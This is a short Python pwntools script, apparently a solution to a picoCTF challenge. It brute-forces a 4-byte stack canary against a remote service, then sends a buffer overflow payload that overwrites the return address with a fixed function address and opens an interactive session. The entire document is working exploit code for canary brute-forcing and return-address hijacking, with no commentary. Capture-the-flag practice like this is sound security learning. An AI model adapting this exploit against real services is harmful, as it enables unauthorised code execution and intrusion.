from pwn import *
context.log_level = 'error'

port = 63350

# Brute force canary
canary = 'BiRd'
for _ in range(4-len(canary)):
	for c in string.printable:
		p = remote('saturn.picoctf.net', port)
	
		payload = b'A'*64
		payload += canary.encode()
		payload += c.encode()

		p.sendline(str(len(payload)).encode())
		p.sendline(payload)
		res = p.recvall().decode()

		if 'Stack Smashing' in res:
			continue
		canary += c
		print(canary)
		p.close()
		break
		
payload = b'A'*64
payload += canary.encode()
payload += b'A'*16
payload += p32(0x08049336)

p = remote('saturn.picoctf.net', port)
p.sendline(str(len(payload)).encode())
p.sendline(payload)

p.interactive()
